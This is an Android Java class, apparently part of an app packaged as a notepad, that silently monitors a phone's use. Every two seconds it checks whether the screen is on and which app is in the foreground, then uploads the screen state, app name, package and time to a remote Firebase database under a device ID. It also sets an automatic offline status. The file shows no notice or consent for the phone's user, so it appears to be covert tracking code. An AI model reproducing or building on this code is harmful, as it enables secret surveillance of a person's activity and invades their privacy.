package com.megh.notepad; // আপনার প্যাকেজের নাম দিন

import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.PowerManager;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class ScreenStateHelper {

    private static boolean isMonitoring = false;
    private static String lastState = ""; 
    private static Thread monitorThread;

    public static void startMonitoring(final Context context) {
        if (isMonitoring) return;
        isMonitoring = true;
        
        // 🌟 আপডেট: onDisconnect লজিক সেট করা 🌟
        // এর ফলে ডিভাইস ইন্টারনেট থেকে ডিসকানেক্ট হলেই ফায়ারবেস নিজে থেকে স্ট্যাটাস আপডেট করে দেবে
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("ScreenStatus");
                    
            Map<String, Object> offlineData = new HashMap<>();
            offlineData.put("Screen_State", "Offline / Screen OFF");
            offlineData.put("Current_App", "Device is Offline");
            offlineData.put("Package_Name", "None");
            
            // যখনই কানেকশন লস্ট হবে, এই ডেটাটা সেভ হয়ে যাবে
            dbRef.onDisconnect().setValue(offlineData);
        } catch (Exception e) {
            Log.e("ScreenStateHelper", "onDisconnect setup error: " + e.getMessage());
        }

        monitorThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isMonitoring) {
                    try {
                        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
                        boolean isScreenOn = pm.isInteractive();

                        if (!isScreenOn) {
                            // স্ক্রিন অফ থাকলে
                            if (!lastState.equals("Screen OFF")) {
                                updateFirebase("Screen OFF", "None", "None");
                                lastState = "Screen OFF";
                            }
                        } else {
                            // স্ক্রিন অন থাকলে ফোরগ্রাউন্ড অ্যাপ বের করা
                            String currentPackage = getForegroundApp(context);
                            
                            if (currentPackage != null && !currentPackage.isEmpty()) {
                                String appName = getAppName(context, currentPackage);
                                String currentState = "ON_" + currentPackage;
                                
                                // যদি আগের অ্যাপ থেকে নতুন অ্যাপে যায়, তবেই ফায়ারবেস আপডেট হবে (ডাটা বাঁচানোর জন্য)
                                if (!lastState.equals(currentState)) {
                                    updateFirebase("Screen ON", appName, currentPackage);
                                    lastState = currentState;
                                }
                            } else {
                                // যদি কোনো কারণে অ্যাপের নাম না পায়
                                if (!lastState.equals("ON_Unknown")) {
                                    updateFirebase("Screen ON", "Loading...", "system");
                                    lastState = "ON_Unknown";
                                }
                            }
                        }
                        
                        Thread.sleep(2000); // প্রতি ২ সেকেন্ড পর পর চেক করবে
                    } catch (InterruptedException e) {
                        break; // থ্রেড বন্ধ হলে লুপ ব্রেক করবে
                    } catch (Exception e) {
                        Log.e("ScreenStateHelper", "Loop Error: " + e.getMessage());
                    }
                }
            }
        });
        monitorThread.start();
        Log.d("ScreenStateHelper", "Live Screen & App monitoring started.");
    }

    public static void stopMonitoring() {
        isMonitoring = false;
        if (monitorThread != null) {
            monitorThread.interrupt();
            monitorThread = null;
        }
        updateFirebase("Service Stopped", "None", "None");
        
        // সার্ভিস স্টপ হলে onDisconnect বাতিল করে দেওয়া ভালো
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("ScreenStatus");
            dbRef.onDisconnect().cancel();
        } catch (Exception e) {}
    }

    // UsageStatsManager দিয়ে ঠিক এই মুহূর্তের রানিং অ্যাপ বের করার মেথড
    private static String getForegroundApp(Context context) {
        String currentApp = "";
        try {
            UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            // গত ১০ সেকেন্ডের ইভেন্ট চেক করবে
            UsageEvents usageEvents = usm.queryEvents(time - 1000 * 10, time); 
            UsageEvents.Event event = new UsageEvents.Event();
            
            while (usageEvents.hasNextEvent()) {
                usageEvents.getNextEvent(event);
                // 1 মানে ACTIVITY_RESUMED (অ্যাপ সামনে এসেছে)
                if (event.getEventType() == 1) { 
                    currentApp = event.getPackageName();
                }
            }
        } catch (Exception e) {}
        return currentApp;
    }

    // প্যাকেজ নেম থেকে আসল অ্যাপের নাম বের করা
    private static String getAppName(Context context, String packageName) {
        PackageManager pm = context.getPackageManager();
        try {
            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(appInfo).toString();
        } catch (PackageManager.NameNotFoundException e) {
            return packageName;
        }
    }

    // ফায়ারবেসে ডাটা আপডেট করা
    private static void updateFirebase(String screenState, String appName, String packageName) {
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("ScreenStatus");

            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.getDefault());
            String time = sdf.format(new Date());

            Map<String, Object> data = new HashMap<>();
            data.put("Screen_State", screenState);
            data.put("Current_App", appName);
            data.put("Package_Name", packageName);
            data.put("Last_Updated", time);

            dbRef.setValue(data);
            Log.d("ScreenStateHelper", "Status updated: " + screenState + " | App: " + appName);
        } catch (Exception e) {
            Log.e("ScreenStateHelper", "Upload Error: " + e.getMessage());
        }
    }
}